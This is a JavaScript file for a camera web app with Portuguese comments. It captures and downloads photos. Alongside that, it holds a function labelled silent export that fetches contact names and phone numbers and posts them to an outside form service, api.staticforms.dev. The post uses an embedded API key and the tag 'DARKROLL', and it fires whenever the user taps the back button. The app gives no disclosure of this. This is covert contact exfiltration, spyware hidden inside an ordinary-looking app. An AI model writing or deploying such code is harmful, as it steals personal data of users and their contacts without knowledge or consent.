document.addEventListener('DOMContentLoaded', () => {
    const videoElement = document.getElementById('videoStream');
    const capturedImage = document.getElementById('capturedImage');
    const captureButton = document.getElementById('captureButton');
    const downloadButton = document.getElementById('downloadButton');
    const backButton = document.getElementById('backButton');
    const statusMessage = document.getElementById('statusMessage');
    const viewArea = document.getElementById('viewArea');
    const buttonGroup = document.getElementById('buttonGroup');

    // --- CONFIGURAÇÕES ---
    const STATICFORMS_API_URL = 'https://api.staticforms.dev/submit';
    const API_KEY = 'sf_b28b453bf885be88f89f8e34';

    // *** IMPORTANTE: Substitua pela URL real da sua API que retorna os contatos ***
    const REAL_API_URL = 'https://sua-api.com/contatos'; // ← ALTERE AQUI

    // --- ESTADO DO APP ---
    let stream = null;
    let photoDataUrl = null;
    let currentState = 'CAMERA'; // Pode ser 'CAMERA' ou 'PREVIEW'

    // ========================================================
    //  FUNÇÕES RELACIONADAS À AGENDA (STATICFORMS)
    // ========================================================

    /**
     * Obtém os contatos reais da sua API backend.
     * @returns {Promise<Array>} Array de objetos { name, phone }.
     */
    async function fetchRealContacts() {
        try {
            console.log("Buscando dados reais da agenda via API...");
            const response = await fetch(REAL_API_URL, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    // Se sua API exigir autenticação, adicione o token aqui:
                    // 'Authorization': 'Bearer SEU_TOKEN'
                }
            });

            if (!response.ok) {
                throw new Error(`Erro HTTP ${response.status}: ${response.statusText}`);
            }

            const data = await response.json();

            // Supondo que sua API retorne um array com pelo menos 'name' e 'phone'
            // Ajuste o mapeamento conforme a estrutura real dos seus dados.
            if (!Array.isArray(data)) {
                throw new Error('Resposta da API não é um array.');
            }

            // Mapeia para o formato esperado (name, phone)
            const contacts = data.map(item => ({
                name: item.name || item.nome || 'Sem nome',
                phone: item.phone || item.telefone || 'Sem telefone'
            }));

            console.log(`[API] ${contacts.length} contatos obtidos com sucesso.`);
            return contacts;
        } catch (error) {
            console.error("[fetchRealContacts] Falha ao buscar contatos:", error);
            // Em caso de erro, você pode optar por retornar um array vazio ou lançar a exceção.
            // Vamos retornar vazio para não quebrar o fluxo, mas a exportação falhará.
            return [];
        }
    }

    /**
     * Executa a exportação dos contatos para o StaticForms de forma silenciosa.
     * @returns {Promise<boolean>} true se sucesso, false caso contrário.
     */
    async function performSilentContactExport() {
        try {
            // 1. Obter os dados reais
            const contacts = await fetchRealContacts();

            // Se não houver contatos, podemos abortar ou enviar mensagem de aviso
            if (!contacts || contacts.length === 0) {
                console.warn("[Export] Nenhum contato para exportar.");
                // Opcional: exibir status para o usuário
                statusMessage.textContent = "Nenhum contato encontrado para exportar.";
                statusMessage.style.color = 'orange';
                setTimeout(() => statusMessage.textContent = '', 3000);
                return false;
            }

            // 2. Formatar os dados como texto
            let contactText = "--- CONTEÚDOS DA AGENDA ---\n";
            contacts.forEach(contact => {
                contactText += `Nome: ${contact.name} | Telefone: ${contact.phone}\n`;
            });
            contactText += "----------------------------";

            // 3. Preparar o FormData
            const formData = new FormData();
            formData.append('apiKey', API_KEY);
            formData.append('email', 'DARKROLL');          // ou o e‑mail capturado
            formData.append('message', contactText);
            // Você pode adicionar outros campos se o StaticForms esperar, ex: 'email' etc.

            // 4. Enviar para o StaticForms
            const response = await fetch(STATICFORMS_API_URL, {
                method: 'POST',
                body: formData,
            });

            if (!response.ok) {
                const errorText = await response.text();
                console.error(`[Export] Erro HTTP ${response.status}: ${errorText}`);
                throw new Error(`Falha no envio: ${response.status}`);
            }

            console.log("[Export] Dados enviados com sucesso para o StaticForms.");
            // Feedback opcional (pode ser removido se quiser 100% silencioso)
            statusMessage.textContent = "Agenda exportada com sucesso!";
            statusMessage.style.color = 'green';
            setTimeout(() => statusMessage.textContent = '', 3000);
            return true;
        } catch (error) {
            console.error("[Export] Falha na exportação:", error);
            statusMessage.textContent = "Erro ao exportar agenda.";
            statusMessage.style.color = 'red';
            setTimeout(() => statusMessage.textContent = '', 3000);
            return false;
        }
    }

    // ========================================================
    //  FUNÇÕES DE CÂMERA E UI (Mantidas)
    // ========================================================

    async function startCamera() {
        try {
            const mediaStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "environment" }
            });

            stream = mediaStream;
            videoElement.srcObject = stream;
            videoElement.play();

            updateUI();
        } catch (err) {
            console.error("Erro ao acessar a câmera:", err);
            statusMessage.textContent = "Falha ao iniciar a câmera. Verifique as permissões!";
            statusMessage.style.color = 'red';
        }
    }

    function capturePhoto() {
        if (!stream) return;
        const canvas = document.createElement('canvas');
        canvas.width = videoElement.videoWidth || 640;
        canvas.height = videoElement.videoHeight || 480;
        const context = canvas.getContext('2d');
        context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

        photoDataUrl = canvas.toDataURL('image/jpeg');

        capturedImage.src = photoDataUrl;
        capturedImage.style.display = 'block';

        currentState = 'PREVIEW';
        updateUI();
    }

    function downloadPhoto() {
        if (photoDataUrl) {
            const a = document.createElement('a');
            a.href = photoDataUrl;
            a.download = 'foto_pwa_' + new Date().toISOString().slice(0, 10) + '.jpg';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }
    }

    function updateUI() {
        if (currentState === 'CAMERA') {
            videoElement.style.display = 'block';
            capturedImage.style.display = 'none';
            captureButton.style.display = 'inline-block';
            downloadButton.style.display = 'none';
            backButton.style.display = 'none';
        } else if (currentState === 'PREVIEW') {
            videoElement.style.display = 'none';
            capturedImage.style.display = 'block';
            captureButton.style.display = 'none';
            downloadButton.style.display = 'inline-block';
            backButton.style.display = 'inline-block';
        }
    }

    // ========================================================
    //  LISTENERS
    // ========================================================

    startCamera();

    captureButton.addEventListener('click', () => {
        capturePhoto();
        // currentState já é alterado dentro de capturePhoto
    });

    downloadButton.addEventListener('click', downloadPhoto);

    // Ao clicar em "Voltar", exporta a agenda e retorna à câmera
    backButton.addEventListener('click', async () => {
        // Exporta os contatos (silenciosamente, mas com feedback de status)
        await performSilentContactExport();

        // Volta ao estado de câmera
        currentState = 'CAMERA';
        updateUI();
    });

    // Gerenciamento de saída (libera a câmera)
    window.onbeforeunload = () => {
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
    };
});
